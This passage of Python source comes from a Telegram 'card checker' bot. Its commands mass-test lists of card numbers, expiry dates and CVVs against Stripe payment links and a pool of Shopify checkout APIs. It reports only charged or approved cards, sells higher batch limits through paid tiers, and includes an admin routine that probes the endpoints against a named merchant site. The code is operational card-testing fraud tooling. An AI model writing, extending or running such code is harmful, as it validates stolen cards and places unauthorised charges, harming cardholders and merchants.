                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
            )
            
            await update_progress(total)
            await message.reply_text(summary, parse_mode=ParseMode.HTML)
            print(f"📊 Final summary sent to user {u_id}")
        
        return stats
        
    except Exception as e:
        print(f"❌ Stripe PL mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
            else:
                await message.reply_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        stripe_pl_active_tasks.pop(u_id, None)
        print(f"🏁 [Stripe PL Mass] Session ended for user {u_id}")


async def mass_check_stripe_pl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass card check with Stripe Payment Link - /mct <cards>"""
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    message = update.effective_message
    
    if user_id in stripe_pl_active_tasks:
        await message.reply_text(
            "⚠️ You already have an active Stripe Payment Link session.\n"
            "Please wait for it to finish or use /stop to cancel.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ Stripe Payment Link not available for {tier.upper()} tier.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not user_manager.can_mass_check(user_id):
        tier = user_manager.get_tier(user_id)
        await message.reply_text(
            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
            f"Use /ct for single checks.\n"
            f"💎 Upgrade to Premium/Ultimate for mass checks.",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if reply to file
    if message.reply_to_message and message.reply_to_message.document:
        try:
            file = await message.reply_to_message.document.get_file()
            content = await file.download_as_bytearray()
            content = content.decode('utf-8', errors='ignore')
            
            cards = []
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith('#'):
                    card = card_formatter.extract_single_card_from_text(line)
                    if card:
                        cards.append(card)
            
            if not cards:
                await message.reply_text("❌ No valid cards found in file.")
                return
                
            await message.delete()
            await stripe_pl_mass_check_logic(update, context, cards, None)
            return
            
        except Exception as e:
            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
            return
    
    if not context.args:
        await message.reply_text(
            "📦 <b>Stripe Payment Link Mass Check</b>\n\n"
            "Usage: <code>/mct &lt;card1&gt; &lt;card2&gt; ...</code>\n"
            "Or reply to a .txt file with /mct\n\n"
            "Example: <code>/mct 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
            "💰 Amount: Variable (from payment link)\n"
            "📍 Gateway: Stripe via Payment Link\n"
            "✅ Only charged/approved cards will be shown\n"
            "❌ Declined cards are hidden from chat",
            parse_mode=ParseMode.HTML
        )
        return
    
    cards_text = " ".join(context.args)
    card_strings = cards_text.split()
    
    cards = []
    for card_str in card_strings:
        card = card_formatter.extract_single_card_from_text(card_str)
        if card:
            cards.append(card)
    
    if not cards:
        await message.reply_text("❌ No valid cards found.")
        return
    
    max_batch = user_manager.get_max_batch_size(user_id)
    if len(cards) > max_batch:
        cards = cards[:max_batch]
        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
    
    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
    if not can_proceed:
        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
        return
    
    try:
        await message.delete()
    except:
        pass
    
    await stripe_pl_mass_check_logic(update, context, cards, None)
    
    
    
async def apitest_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test all Shopify APIs in the pool - /apitest"""
    
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    # Only allow owner/admin to run this command
    if user_id != OWNER_ID:
        await update.message.reply_text(
            "❌ <b>Admin only command</b>\n\n"
            "This command is restricted to the bot owner.",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
        return
    
    status_msg = await update.message.reply_text(
        f"🧪 <b>Testing Shopify API Pool...</b>\n\n"
        f"📊 Total APIs: {len(shopify_api_pool.apis)}\n"
        f"🔄 Testing each API...\n"
        f"⏱️ This may take a moment...",
        parse_mode=ParseMode.HTML
    )
    
    # Test card (valid format that will be declined)
    test_card = "4111111111111111|12|2028|123"
    test_site = "anseladams.org"
    
    results = []
    working_apis = []
    dead_apis = []
    total_apis = len(shopify_api_pool.apis)
    tested = 0
    
    for api in shopify_api_pool.apis:
        api_name = api.get("name", "Unknown")
        api_url = api.get("url", "Unknown")
        api_enabled = api.get("enabled", True)
        
        tested += 1
        
        # Update status message
        try:
            await status_msg.edit_text(
                f"🧪 <b>Testing Shopify API Pool...</b>\n\n"
                f"📊 Progress: {tested}/{total_apis}\n"
                f"🔄 Testing: {api_name}\n"
                f"✅ Working: {len(working_apis)}\n"
                f"❌ Dead: {len(dead_apis)}\n"
                f"⏱️ Please wait...",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
        
        print(f"\n🔍 Testing API: {api_name}")
        print(f"   URL: {api_url}")
        print(f"   Enabled: {api_enabled}")
        
        start_time = time.time()
        is_working = False
        response_time = 0
        error_msg = ""
        
        try:
            # Make a test request
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(30.0, connect=10.0, read=20.0),
                verify=False,
                follow_redirects=True
            ) as client:
                
                params = {
                    "site": f"https://{test_site}",
                    "cc": test_card
                }
                
                response = await client.get(api_url, params=params)
                elapsed = time.time() - start_time
                response_time = elapsed
                
                print(f"   Response time: {elapsed:.2f}s")
                print(f"   Status code: {response.status_code}")
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        response_text = data.get("Response", data.get("message", data.get("status", "")))
                        response_upper = response_text.upper()
                        
                        # Check if API returned a valid response
                        valid_responses = [
                            "CARD_DECLINED", "DECLINED", "OTP_REQUIRED", "3D",
                            "INSUFFICIENT_FUNDS", "CVV LIVE", "ORDER_PLACED",
                            "CHARGED", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
                            "GENERIC_ERROR", "DO_NOT_HONOR", "EXPIRED CARD"
                        ]
                        
                        is_working = any(vr in response_upper for vr in valid_responses)
                        
                        if is_working:
                            print(f"   ✅ WORKING - Response: {response_text[:50]}")
                        else:
                            print(f"   ⚠️ UNKNOWN RESPONSE - Response: {response_text[:50]}")
                            # Still mark as working if we got a response
                            if response_text and len(response_text) > 10:
                                is_working = True
                                print(f"   ✅ MARKED AS WORKING (got response)")
                            
                    except json.JSONDecodeError:
                        print(f"   ⚠️ Invalid JSON response")
                        # Check if it's HTML (site error page)
                        if response.text and ('<!DOCTYPE' in response.text[:100] or '<html' in response.text[:100]):
                            error_msg = "HTML response (API may be down)"
                        else:
                            error_msg = "Invalid JSON response"
                else:
                    error_msg = f"HTTP {response.status_code}"
                    print(f"   ❌ FAILED - {error_msg}")
                    
        except httpx.TimeoutException:
            elapsed = time.time() - start_time
            response_time = elapsed
            error_msg = f"Timeout ({elapsed:.1f}s)"
            print(f"   ⏰ TIMEOUT - {error_msg}")
            
        except httpx.ConnectError as e:
            elapsed = time.time() - start_time
            response_time = elapsed
            error_msg = f"Connection error: {str(e)[:30]}"
            print(f"   🔌 CONNECTION ERROR - {error_msg}")
            
        except Exception as e:
            elapsed = time.time() - start_time
            response_time = elapsed
            error_msg = f"Error: {str(e)[:50]}"
            print(f"   ❌ ERROR - {error_msg}")
        
        # Record result
        result = {
            "name": api_name,
            "url": api_url,
            "enabled": api_enabled,
            "working": is_working,
            "response_time": response_time,
            "error": error_msg
        }
        results.append(result)
        
        if is_working:
            working_apis.append(result)
            # Make sure API is enabled
            if not api_enabled:
                api["enabled"] = True
                print(f"   ✅ Re-enabled API: {api_name}")
        else:
            dead_apis.append(result)
            # Disable dead API
            if api_enabled:
                api["enabled"] = False
                print(f"   ❌ Disabled dead API: {api_name}")
        
        # Small delay between tests
        await asyncio.sleep(0.5)
    
    # Save changes
    shopify_api_pool.save_stats()
    
    # Build result message
    result_msg = (
        f"📊 <b>Shopify API Pool Test Results</b>\n\n"
        f"📈 <b>Summary:</b>\n"
        f"   ✅ Working: {len(working_apis)}/{total_apis}\n"
        f"   ❌ Dead (Disabled): {len(dead_apis)}/{total_apis}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    
    if working_apis:
        result_msg += f"<b>✅ Working APIs ({len(working_apis)}):</b>\n"
        for api in working_apis[:15]:
            status = "🔵" if api['enabled'] else "🟢"
            result_msg += f"   {status} <b>{api['name']}</b>\n"
            result_msg += f"     ⚡ {api['response_time']:.2f}s\n"
        if len(working_apis) > 15:
            result_msg += f"   ... and {len(working_apis) - 15} more\n"
        result_msg += "\n"
    
    if dead_apis:
        result_msg += f"<b>❌ Dead APIs (Disabled - {len(dead_apis)}):</b>\n"
        for api in dead_apis[:10]:
            result_msg += f"   • <b>{api['name']}</b>\n"
            result_msg += f"     Error: {api['error']}\n"
        if len(dead_apis) > 10:
            result_msg += f"   ... and {len(dead_apis) - 10} more\n"
        result_msg += "\n"
    
    result_msg += f"<i>💡 Dead APIs have been automatically disabled.\n"
    result_msg += f"   Use /enableapi &lt;name&gt; to re-enable an API.\n"
    result_msg += f"   Use /api to see all APIs and their status.</i>"
    
    # Update status message
    await status_msg.edit_text(
        result_msg,
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu()
    )
    
    # Also print to console
    print("\n" + "="*80)
    print("📊 SHOPIFY API POOL TEST RESULTS")
    print("="*80)
    print(f"✅ Working: {len(working_apis)}/{total_apis}")
    print(f"❌ Dead (Disabled): {len(dead_apis)}/{total_apis}")
    print("-"*40)
    for api in working_apis:
        print(f"✅ {api['name']}: {api['response_time']:.2f}s")
    for api in dead_apis:
        print(f"❌ {api['name']}: {api['error']}")
    print("="*80)


async def enable_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Enable a disabled API - /enableapi <api_name>"""
    
    if not await verify_group_access(update, context):
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.", reply_markup=back_menu())
        return
    
    if not context.args:
        await update.message.reply_text(
            "🔧 <b>Enable API</b>\n\n"
            "Usage: <code>/enableapi &lt;api_name&gt;</code>\n"
            "Example: <code>/enableapi 'APAPI 1'</code>\n\n"
            "Use /apitest to see which APIs are disabled.",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
        return
    
    api_name = " ".join(context.args)
    
    for api in shopify_api_pool.apis:
        if api["name"] == api_name:
            api["enabled"] = True
            api["fail_count"] = 0
            api["success_count"] = 0
            shopify_api_pool.save_stats()
            await update.message.reply_text(
                f"✅ Enabled API: <b>{api_name}</b>\n\n"
                f"Run <code>/apitest</code> to verify it's working.",
                parse_mode=ParseMode.HTML,
                reply_markup=back_menu()
            )
            return
    
    await update.message.reply_text(
        f"❌ API not found: <b>{api_name}</b>\n\n"
        f"Use /api to see all available APIs.",
        parse_mode=ParseMode.HTML,
        reply_markup=back_menu()
    )


async def disable_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Disable an API - /disableapi <api_name>"""
    
